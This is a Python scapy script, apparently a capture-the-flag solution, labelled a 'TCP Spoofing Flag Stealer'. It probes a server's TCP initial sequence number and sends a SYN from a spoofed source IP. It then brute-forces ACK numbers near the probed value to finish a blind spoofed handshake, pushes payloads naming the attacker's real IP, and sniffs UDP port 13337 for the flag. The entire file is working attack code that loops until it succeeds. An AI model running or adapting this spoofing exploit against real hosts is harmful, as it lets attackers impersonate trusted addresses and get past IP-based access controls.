from scapy.all import Ether, IP, TCP, UDP, ARP, sendp, sr1, sniff, get_if_hwaddr, srp
import threading
import time

iface = "eth0"
real_ip = "10.0.0.2"
spoofed_ip = "10.2.4.10"
target_ip = "10.0.0.3"
sport = 54321
dport = 13337
client_seq = 12345
src_mac = get_if_hwaddr(iface)

# === Get target MAC dynamically via ARP ===
def get_mac(ip):
    pkt = Ether(dst="ff:ff:ff:ff:ff:ff") / ARP(pdst=ip)
    ans, _ = srp(pkt, timeout=1, iface=iface, verbose=False)
    if ans:
        return ans[0][1].hwsrc
    else:
        print(f"[-] Could not resolve MAC for {ip}")
        return None

# === Announce our own IP (10.0.0.2) to server ===
def announce_self():
    print("[*] Announcing our IP via ARP to ensure UDP flag delivery...")
    pkt = Ether(dst="ff:ff:ff:ff:ff:ff") / ARP(op=1, psrc=real_ip, pdst=target_ip)
    sendp(pkt, iface=iface, count=3, verbose=False)

# === Sniff for UDP flag ===
flag_found = False
def sniff_flag():
    def handle(pkt):
        global flag_found
        if UDP in pkt and pkt[UDP].dport == 13337:
            print(f"\n[✓] UDP Packet from {pkt[IP].src} to {pkt[IP].dst}:{pkt[UDP].dport}")
            try:
                print("[✓] Flag received:")
                print(pkt[UDP].payload.load.decode(errors="ignore"))
            except:
                print("[!] Couldn't decode flag.")
            flag_found = True
            return True
    sniff(iface=iface, filter="udp and port 13337", prn=handle, timeout=6)

# === Full attack run ===
def run_attack():
    global flag_found
    print("\n[*] Starting spoofing round...\n")

    # Step 1: Probe ISN
    syn_probe = IP(src=real_ip, dst=target_ip) / TCP(sport=sport, dport=dport, flags="S", seq=1111)
    resp = sr1(syn_probe, timeout=1, verbose=False)

    if not resp or not TCP in resp:
        print("[-] Failed to get SYN-ACK. Skipping this round.")
        return

    server_isn = resp[TCP].seq
    print(f"[+] Server ISN: {server_isn}")

    # Step 2: Announce ourselves
    announce_self()

    # Step 3: Start sniffer
    sniffer = threading.Thread(target=sniff_flag)
    sniffer.start()

    # Step 4: Spoofed SYN
    target_mac = get_mac(target_ip)
    if not target_mac:
        print("[-] No target MAC resolved. Skipping this round.")
        return

    syn = Ether(src=src_mac, dst=target_mac) / \
          IP(src=spoofed_ip, dst=target_ip) / \
          TCP(sport=sport, dport=dport, seq=client_seq, flags="S")
    sendp(syn, iface=iface, verbose=False)

    # Step 5: Try guessed ISNs
    for guess in range(server_isn - 30, server_isn + 30):
        target_mac = get_mac(target_ip)
        if not target_mac:
            continue

        ack = Ether(src=src_mac, dst=target_mac) / \
              IP(src=spoofed_ip, dst=target_ip) / \
              TCP(sport=sport, dport=dport, seq=client_seq+1, ack=guess+1, flags="A")

        # === Payloads ===
        payloads = [
            real_ip.encode(),  # raw
            (real_ip + "\n").encode(),
            (real_ip + "\x00").encode(),
            (real_ip + "\n\x00").encode()
        ]

        packets = [ack]
        for payload in payloads:
            psh = Ether(src=src_mac, dst=target_mac) / \
                  IP(src=spoofed_ip, dst=target_ip) / \
                  TCP(sport=sport, dport=dport, seq=client_seq+1, ack=guess+1, flags="PA") / payload
            packets.append(psh)

        sendp(packets, iface=iface, verbose=False)
        print(f"[*] Tried guessed seq: {guess}")
        time.sleep(0.01)

    sniffer.join()

# === Auto-run until flag is found ===
print("[*] TCP Spoofing Flag Stealer Starting...\n")
while not flag_found:
    try:
        run_attack()
        if not flag_found:
            print("[*] Retrying in 5 seconds...\n")
            time.sleep(5)
    except KeyboardInterrupt:
        print("\n[!] Interrupted. Exiting.")
        break


